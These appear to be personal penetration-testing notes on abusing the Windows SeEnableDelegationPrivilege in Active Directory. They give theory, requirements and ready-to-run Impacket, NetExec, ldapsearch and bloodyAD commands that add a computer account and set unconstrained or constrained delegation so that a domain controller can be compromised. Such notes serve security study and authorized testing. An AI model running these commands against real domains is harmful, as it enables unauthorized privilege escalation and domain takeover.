---
Primary_category: "[[WINDOWS PRIVESC]]"
title: "SEENABLEDELEGATIONPRIVILEGE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]

#### *Theory*

The ***seEnableDelegationPrivilege*** gives an account the ability to enable both **`TRUSTED_FOR_DELEGATION`** and **`TRUSTED_TO_AUTH_FOR_DELEGATION`** flags in the *userAccountControl* attribute of a domain service account for which the account in question has *Write* rights, namely →

- ***[[GRANT OWNERSHIP (WRITEOWNER)|WriteOwner]] → GenericAll***

- ***[[GRANT RIGHTS (WRITEDACL)|WriteDACL]] → GenericAll***

- ***[GenericAll ( Full Control )](https://bloodhound.specterops.io/resources/edges/generic-all)***

- ***GenericWrite***

- ***WriteProperty on UserAccountControl attribute***

So, any domain account whose token has this privilege set and enabled, can configure both ***[[UNCONSTRAINED DELEGATION|Unconstrained Delegation ( KUD )]]*** and ***[[CONSTRAINED DELEGATION|Constrained Delegation ( KCD )]]***

> ***The latter with and without Protocol Transition***

Futhermore, it allows the domain account in question to modify the **`msDS-AllowedToDelegateTo`**, an attribute required to perform *KCD* both with and without *Protocol Transition*

Note that it's also required to have *WriteProperty* / *GenericWrite* / *GenericAll* ( aside from *seEnableDelegationPrivilege* ) over *msDS-AllowedToDelegateTo* of the target service account in order to populate or modify it

So, to sum up, ***without the seEnableDelegationPrivilege is not possible to enable both KUD and KCD ( both types )***

> ***This does not apply to [[RBCD]]***

---

#### *Enumeration*

##### *Current User Privileges*

```bash
whoami /priv
```

---

#### *Enabling KUD*

##### *Workflow*

Let's suppose that we compromise a domain user account that belongs to the *Remote Management Users* group of the *DC*, so we can *PSRemote* to the latter

Once we establish a connection, we list the privileges associated with the current *primary access token* and see *seEnableDelegationPrivilege* set and enabled

Subsequently, we check if the user account has any *Write* rights over any service account in the domain, as we have to enable the **`TRUSTED_FOR_DELEGATION`** flag in the *userAccountControl* attribute of any of them in order to enable *KUD* on it

If not, we can check the value of the *msDS-MachineAccountQuota* domain attribute, if it's greater than *0*, we can leverage the controlled user account to add a new computer account to the domain

The user account in question, among other rights, has *WriteProperty* over the *userAccountControl* attribute of the added computer account, so now we really can enable *KUD*, as long as we have *Write* rights over *userAccountControl* and *seEnableDelegationPrivilege* enabled

After that, we can simply ***[[UNCONSTRAINED DELEGATION|Abuse KUD]]*** as always

##### *Requirements*

- ***A controlled domain account with seEnableDelegationPrivilege***

> ***To modify userAccountControl and enable KUD***

- ***WriteProperty / GenericWrite / GenericAll over userAccountControl***

> ***To modify it and enable KUD as well***

- ***Target account must be a Service Account***

> ***i.e. At least one registered SPN***

- ***msDS-MachineAccountQuota greater than 0***

> ***To add a new computer account***

##### *UNIX-Like*

For instance, let's suppose that our controlled user account has *seEnableDelegationPrivilege* set but it does not have *Write* rights over any existing service account in the domain

Then, as stated, we will have to leverage the *msDS-MachineAccountQuota* domain attribute to add a new computer account on which we can enable *KUD* as we will have *WriteProperty* over its *userAccountControl* attribute, along with the mentioned delegation privilege

###### *Checking our current privileges*

> ***seEnableDelegationPrivilege enabled***

```bash
whoami /priv
```

###### *Checking the msDS-MachineAccountQuota domain attribute*

- ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

```bash
nxc ldap '<DC>' --username '<USER>' --password '<PASSWD>' --module maq
```

> [!DANGER]- *e.g.*
>
> ```bash
> nxc ldap DC01.DOMAIN.INTERNAL --username 'john.doe' --password 'password1234$!' --module maq
> ```
>

- ***[LDAPsearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html)***

***Setup***

```bash
nxc smb '<DC>' --generate-krb5-file '<KRB5_FILE>'
cp !$ /etc/krb5.conf
kinit <PRINCIPAL>@<DOMAIN>
```

> [!DANGER]- *e.g.*
>
> ```bash
> nxc smb DC01.DOMAIN.INTERNAL --generate-krb5-file DOMAIN_INTERNAL.krb5
> cp !$ /etc/krb5.conf
> kinit john.doe@DOMAIN.INTERNAL
> ```
>

***Usage***

```bash
ldapsearch -LLL -Y GSSAPI -H 'ldap://<DC_FQDN>' -b 'DC=<DOMAIN>,DC=<TLD>' -s base ms-DS-machineAccountQuota
```

> [!DANGER]- *e.g.*
>
> ```bash
> ldapsearch -LLL -Y GSSAPI -H 'ldap://DC01.DOMAIN.INTERNAL' -b 'DC=DOMAIN,DC=INTERNAL' -s base ms-DS-machineAccountQuota
> ```
>

###### *Adding a new Computer Account to the domain*

- ***[Impacket's addComputer.py](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)***

```bash
addcomputer.py -dc-ip '<DC_IP>' -computer-name '<COMPUTER_NAME>' -computer-pass '<COMPUTER_PASSWD>' '<DOMAIN>/<USER>:<PASSWD>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> addcomputer.py -dc-ip '10.10.10.5' -computer-name 'WKS99$' -computer-pass 'wks1234$!' 'DOMAIN.INTERNAL/john.doe:password1234$!'
> ```
>

###### *Enabling KUD on the added Computer Account*

- ***[BloodyAD](https://github.com/CravateRouge/bloodyAD)***

***Setup***

```bash
mkdir BloodyAD
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install bloodyAD
```

***Usage***

```bash
bloodyAD --host '<DC_FQDN>' --domain '<DOMAIN>' --username '<USER>' --password '<PASSWD>' add uac '<TARGET_COMPUTER_ACCOUNT>' -f 'TRUSTED_FOR_DELEGATION'
```

> [!DANGER]- *e.g.*
>
> ```bash
> bloodyAD --host '10.10.10.5' --domain 'DOMAIN.INTERNAL' --username 'john.doe' --password 'password1234$!' add uac 'WKS99$' -f 'TRUSTED_FOR_DELEGATION'
> ```
>

###### *Abusing KUD*

> ***See [[UNCONSTRAINED DELEGATION|Abusing KUD]]***

##### *Windows*

> 🛠️⌛

---

#### *Enabling KCD with Protocol Transition*

##### *Workflow*

Following the same example as with *KUD*, we compromise a domain user account that has *seEnableDelegationPrivilege* enabled

Then, we validate if the user account has any *Write* rights over any existing service account in the domain, as we must modify *userAccountControl* in order to enable *KCD with PT*

Note that, as stated, we need *WriteProperty* / *GenericWrite* / *GenericAll* over the *userAccountControl* attribute of a service account, in addition to *seEnableDelegationPrivilege*, to enable *KCD* with *PT*

In this case, we must enable the **`TRUSTED_TO_AUTH_FOR_DELEGATION`** within *userAccountControl*

Furthermore, we have to populate the *msDS-AllowedToDelegate* attribute of the given service account with a valid *SPN* for which we will request a *service ticket* during the *S4U2Proxy*

> ***Namely, the SPN of an account that we want to compromise, such as a DC***

To do so, we must have *GenericWrite* / *GenericAll* over *msDS-AllowedToDelegateTo*, along with, again, *seEnableDelegationPrivilege*

So yes, ***seEnableDelegationPrivilege*** is required to write in both *userAccountControl* and *msDS-AllowedToDelegateTo* attributes, along with the necessary and mentioned standard rights

> ***At least WriteProperty over userAccountControl <br> At least GenericWrite over msDS-AllowedToDelegateTo***

In this case, it does not make sense to add a new computer account to the domain by leveraging *msDS-machineAccountQuota* as we will not have *WriteProperty* over its *msDS-AllowedToDelegateTo*, although we can enable **`TRUSTED_TO_AUTH_FOR_DELEGATION`** on its *userAccountControl* attribute

So, to sum up, in order to completely enable *KCD with PT* on a given domain service account, we must have *seEnableDelegationPrivilege* enabled and at least *GenericWrite* over it

Then, we can simply ***[[CONSTRAINED DELEGATION#Abusing KCD with Protocol Transition|Abuse KCD with PT]]*** as always 😊

##### *Requirements*

- ***A controlled domain account with seEnableDelegationPrivilege***

> ***To modify both userAccountControl and msDs-AllowedToDelegateTo***

- ***WriteProperty / GenericWrite / GenericAll over userAccountControl on the target service account***

- ***WriteProperty / GenericWrite / GenericAll over msDS-AllowedToDelegateTo on the target service account***

- ***The target account must have at least one SPN registered***

> ***i.e. It must be a service account ( e.g. a computer account or a user account with at least one SPN )***

##### *UNIX-Like*

###### *Enabling KCD with PT on the target Computer Account*

- ***[BloodyAD](https://github.com/CravateRouge/bloodyAD)***

***Setup***

```bash
mkdir BloodyAD
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install bloodyAD
```

***Usage***

```bash
bloodyAD --host '<DC_FQDN>' --domain '<DOMAIN>' --username '<USER>' --password '<PASSWD>' add uac '<TARGET_COMPUTER_ACCOUNT>' -f 'TRUSTED_TO_AUTH_FOR_DELEGATION'
```

> [!DANGER]- *e.g.*
>
> ```bash
> bloodyAD --host '10.10.10.5' --domain 'DOMAIN.INTERNAL' --username 'john.doe' --password 'password1234$!' add uac 'FS01$' -f 'TRUSTED_TO_AUTH_FOR_DELEGATION'
> ```
>

###### *Populating the msDS-AllowedToDelegateTo attribute of the target Computer Account*

- ***[BloodyAD](https://github.com/CravateRouge/bloodyAD)***

```bash
bloodyAD --host '<DC_FQDN>' --domain '<DOMAIN>' --username '<USER>' --password '<PASSWD>' set object '<TARGET_COMPUTER_ACCOUNT>' 'msDS-AllowedToDelegateTo' -v '<SPN>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> bloodyAD --host 'DC01.DOMAIN.INTERNAL' --domain 'DOMAIN.INTERNAL' --username 'john.doe' --password 'password1234$!' set object 'FS01$' 'msDS-AllowedToDelegateTo' -v 'CIFS/DC01.DOMAIN.INTERNAL'
> ```
>

###### *Abusing KCD with PT*

> ***See [[CONSTRAINED DELEGATION#Abusing KCD with Protocol Transition|Abusing KCD with Protocol Transition]]***

##### *Windows*

> 🛠️⌛

---

#### *Enabling KCD Kerberos-only*

> ***i.e. w/o Protocol Transition***

##### *Workflow*

Once again, following the scenario outlined in the previous cases, this time we want to configure *KCD* without *Protocol Transition* in a given domain service account

We have compromised a user account that has *seEnableDelegation* enabled

Similarly to *KCD with PT*, the user account in question must have at least *WriteProperty* over *msDS-AllowedToDelegateTo* in order to enable *KCD*, along with the mentioned privilege

In this case it's not required to modify its *userAccountControl* attribute as we do not need *Protocol Transition*

We have to bear in mind that *Protocol Transition* is a feature enabled within the *userAccountControl* of a given service account that allows another service account to perform a *S4U2Self* and obtain a *Forwardable Service Ticket* to itself as any principal

Without *PT*, we will receive a *non-forwardable service ticket* when carrying out a *S4U2Self*, which cannot be submitted as *additional-ticket* during the subsequent *S4U2Proxy*, as the latter process requires a *forwardable ticket*

However, we can leverage ***[[RBCD]]*** to obtain a *forwardable service ticket* to the target service account as any domain principal. Then we can submit the latter as *additional-ticket* during a *S4U2Proxy* to obtain a valid *service ticket* for the provided *SPN*, which is the one we added on the *msDS-AllowedToDelegateTo* attribute previously

So, we must enable *RBCD* on the service account for which we have enabled *KCD*

To do so, we must have either at least *WriteProperty* / *GenericWrite* / *GenericAll* over its *msDS-AllowedToActOnBehalfOfOtherIdentity* attribute or the credentials of the given service account, as *"any service account can edit its own RBCD attribute"*

So, to sum up, in order to enable *KCD w/o PT* on a given domain service account, we must have *seEnableDelegationPrivilege* enabled and, at least, *WriteProperty* over both *msDS-AllowedToDelegateTo* and *msDS-AllowedToActOnBehalfOfOtherIdentiy* attributes

> ***The latter can be replaced with "Having valid credential for the service account with KCD enabled" ( As stated )***

After that, we can simply ***[[CONSTRAINED DELEGATION#Abusing KCD w/o Protocol Transition|Abuse KCD w/o PT]]***

##### *Requirements*

- ***A controlled domain account with seEnableDelegationPrivilege***

> ***To modify msDs-AllowedToDelegateTo of the target service account***

- ***WriteProperty / GenericWrite / GenericAll over msDS-AllowedToDelegateTo on the target service account***

- ***The target account must have at least one SPN registered***

> ***i.e. It must be a service account ( e.g. a computer account or a user account with at least one SPN )***

##### *UNIX-Like*

###### *Populating the msDS-AllowedToDelegateTo attribute of the target Computer Account*

- ***[BloodyAD](https://github.com/CravateRouge/bloodyAD)***

```bash
bloodyAD --host '<DC_FQDN>' --domain '<DOMAIN>' --username '<USER>' --password '<PASSWD>' set object '<TARGET_COMPUTER_ACCOUNT>' 'msDS-AllowedToDelegateTo' -v '<SPN>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> bloodyAD --host 'DC01.DOMAIN.INTERNAL' --domain 'DOMAIN.INTERNAL' --username 'john.doe' --password 'password1234$!' set object 'FS01$' 'msDS-AllowedToDelegateTo' -v 'CIFS/DC01.DOMAIN.INTERNAL'
> ```
>

###### *Abusing KCD w/o PT*

> ***See [[CONSTRAINED DELEGATION#Abusing KCD w/o Protocol Transition|Abusing KCD without Protocol Transition]]***


##### *Windows*

> 🛠️⌛